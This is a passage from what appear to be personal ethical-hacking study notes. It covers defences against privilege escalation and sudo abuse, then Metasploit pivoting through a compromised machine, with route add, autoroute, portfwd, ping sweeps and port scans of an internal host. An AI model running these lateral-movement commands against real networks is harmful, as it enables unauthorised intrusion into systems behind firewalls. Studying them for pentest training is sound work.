■ Parchear y actualizar periódicamente el kernel.
■ Cambiar la configuración del UAC a "Siempre notificar", de modo que aumente la visibilidad del usuario
cuando se solicite la elevación del UAC.
■ Restringir a los usuarios la escritura de archivos en las rutas de búsqueda de las aplicaciones.
■ Supervisar continuamente los permisos del sistema de archivos mediante herramientas de auditoría.
■ Reducir los privilegios de las cuentas y grupos de usuarios para que sólo los administradores legítimos
puedan realizar cambios en el servicio.
■ Utilizar herramientas de listas blancas para identificar y bloquear el software malicioso que cambia los
permisos de archivos, directorios o servicios.
■ Utilizar rutas totalmente cualificadas en todas las aplicaciones de Windows.
■ Asegúrese de que los ejecutables ali se colocan en directorios protegidos contra escritura.
■ En los sistemas operativos Mac, impida que los archivos plist sean alterados por los usuarios haciéndolos de
sólo lectura.
■ Bloquear las utilidades del sistema no deseadas o el software que pueda utilizarse para programar tareas.
■ Parchear y actualizar regularmente los servidores web.
■ Desactivar la cuenta de administrador local por defecto.
■ Detectar, reparar y solucionar cualquier fallo o error que se ejecute en los servicios del sistema.

### Defender contra el abuso de los derechos sudo:
■ Implementar una política de contraseñas fuertes para los usuarios sudo.
■ Desactivar el almacenamiento en caché de las contraseñas estableciendo el timestamp_timeout en O, de
modo que cada vez que se ejecute sudo los usuarios deban introducir su contraseña.
■ Separar las cuentas administrativas de nivel sudo de las cuentas regulares del administrador, para evitar el
robo de contraseñas sensibles.
■ Actualizar los permisos y las cuentas de los usuarios a intervalos regulares.
■ Probar los usuarios sudo con acceso a programas que contengan parámetros para la ejecución de código
arbitrario.

</div></div>


# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

# Pivoting and relaying

</div>



| Option                                               | Description                                                       |
| ---------------------------------------------------- | ----------------------------------------------------------------- |
| `ip route add "IP descubierta" via "gateway"`        | IP Routing (Acceder a otra IP a la que no tengamos accesibilidad) |
| `ip route add 10.10.16.0/24 via 10.10.16.1 dev tap0` |                                                                   |
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- We gonna Route the trafic
- We need acces to the machine 2 and `bg` that seasson
- `1` is the number **session** background of the second machine hacked
- We want to reach the `Machine 3`
## Discover the third machine
- If we don't know the machine3 IP
- Module to send ping to discover the machine 3
```shell
use post/multi/gather/ping_sweep
set rhosts machine3_IP/24
set session X
```
## Method 1 (easy)
- Only work inside `metasploit`

| Option                                                                        | Description                             |
| ----------------------------------------------------------------------------- | --------------------------------------- |
| `route add machine3_IP 255.255.255.0 1`<br>or<br>`route add machine3_IP/24 1` | Add route to the seasson `1`            |
| `route print`                                                                 | Show route                              |
| `auxiliary/scanner/portscan/tcp`                                              | Module to scan ports on the machine3_IP |
| `portfwd add -l 33 -p 80 -r IP_machine3`                                      | lport 33, rport 80, rhost IP_machine3   |
| `portfwd delete -l 8080 -p 80 -r 10.0.2.3`                                    | Delete                                  |
| `portfwd list`                                                                | List porforwarding configs              |
## Method 2

| Option                           | Description        |
| -------------------------------- | ------------------ |
| `autorute`                       | Module to pivoting |
| `run autoroute -s 10.10.16.0/24` |                    |
## Method 3
- We need meterpreter
- The ip of machine2

| Option                         | Description |
| ------------------------------ | ----------- |
| `run autorute -s 10.0.33.0/24` |             |
| `run autorute -p`              | Show routes |


</div></div>

# Description
- Los atacantes utilizan la técnica de pivoteo para comprometer un sistema, obtener un acceso shell remoto en él, y además saltarse el firewall para pivotear a el sistema comprometido para acceder a otros sistemas vulnerables en la red.
- Los atacantes utilizan la técnica de retransmisión para acceder a recursos presentes en otros sistemas a través del sistema 
- comprometido, de forma que las solicitudes de acceso a los recursos procedan del sistema inicialmente comprometido.
![Pasted image 20230909122521.png|700](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909122521.png)

![Pasted image 20230909123601.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909123601.png)

![Pasted image 20230909123728.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909123728.png)



</div></div>
